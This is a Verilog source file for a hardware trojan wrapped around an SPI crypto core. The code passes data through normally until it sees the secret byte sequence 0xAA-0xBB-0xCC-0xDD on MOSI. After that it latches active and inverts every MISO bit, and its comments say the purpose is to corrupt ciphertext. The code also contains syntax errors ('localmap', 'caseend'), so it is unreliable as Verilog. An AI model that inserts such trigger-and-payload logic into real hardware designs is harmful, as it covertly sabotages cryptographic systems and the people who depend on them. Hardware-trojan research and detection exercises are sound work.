module trojan_wrapper (
    input  wire clk,         // SPI Clock (SCK)
    input  wire rst_n,       // Active-low Reset
    input  wire cs_n,        // Chip Select (0 = Active)
    input  wire mosi_in,     // Raw MOSI line from the outside world
    output wire mosi_to_core,// Passed-through MOSI to the original 46k core
    input  wire miso_from_core, // Raw MISO coming out of the 46k core
    output wire miso_out     // Final MISO line sent back to the Boss chip
);

    // --- 1. Pass-through Logic ---
    // Under all conditions, the original core must receive data normally 
    // so it doesn't break baseline functionality during normal execution.
    assign mosi_to_core = mosi_in;

    // --- 2. Shift Register to Capture Incoming Bytes ---
    reg [7:0] shift_reg;     // Assembles bits into a full byte
    reg [2:0] bit_cnt;       // Counts from 0 to 7 bits
    reg       byte_ready;    // Pulses high for 1 cycle when a full byte arrives

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            shift_reg  <= 8'b0;
            bit_cnt    <= 3'b0;
            byte_ready <= 1'b0;
        end else if (!cs_n) begin
            // Shift incoming bits into our register (MSB first, matching standard SPI)
            shift_reg  <= {shift_reg[6:0], mosi_in};
            bit_cnt    <= bit_cnt + 1'b1;
            
            if (bit_cnt == 3'd7) begin
                byte_ready <= 1'b1; // We have a fully assembled byte!
            end else begin
                byte_ready <= 1'b0;
            end
        end else begin
            byte_ready <= 1'b0;
            bit_cnt    <= 3'b0;
        end
    end

    // --- 3. State Machine (The Combination Lock) ---
    // We are looking for the sequence: 0xAA -> 0xBB -> 0xCC -> 0xDD
    localmap IDLE   = 3'd0,
             STATE_AA = 3'd1,
             STATE_BB = 3'd2,
             STATE_CC = 3'd3,
             TRIGGERED= 3'd4;

    reg [2:0] current_state, next_state;
    reg       trojan_active; // The internal trigger flag

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            current_state <= IDLE;
            trojan_active <= 1'b0;
        end else begin
            current_state <= next_state;
            if (current_state == TRIGGERED) begin
                trojan_active <= 1'b1; // Trap sprung! Stays active until reset
            end
        end
    end

    always @(*) begin
        next_state = current_state; // Default hold state
        
        if (byte_ready) begin
            case (current_state)
                IDLE: begin
                    if (shift_reg == 8'hAA) next_state = STATE_AA;
                end
                STATE_AA: begin
                    if (shift_reg == 8'hBB)      next_state = STATE_BB;
                    else if (shift_reg == 8'hAA) next_state = STATE_AA; // Handle repeated start bytes
                    else                         next_state = IDLE;
                end
                STATE_BB: begin
                    if (shift_reg == 8'hCC)      next_state = STATE_CC;
                    else if (shift_reg == 8'hAA) next_state = STATE_AA;
                    else                         next_state = IDLE;
                end
                STATE_CC: begin
                    if (shift_reg == 8'hDD)      next_state = TRIGGERED;
                    else if (shift_reg == 8'hAA) next_state = STATE_AA;
                    else                         next_state = IDLE;
                end
                TRIGGERED: begin
                    next_state = TRIGGERED; // Locked in malicious state until hard reset
                end
                default: next_state = IDLE;
            caseend
        end
    end

    // --- 4. The Payload (The Malicious Switch) ---
    // If trojan_active is 0, the output is perfectly clean.
    // If trojan_active becomes 1, it inverts (flips) every bit on the fly, 
    // corrupting the ciphertext and failing the system validation checks.
    assign miso_out = (trojan_active) ? ~miso_from_core : miso_from_core;

endmodule
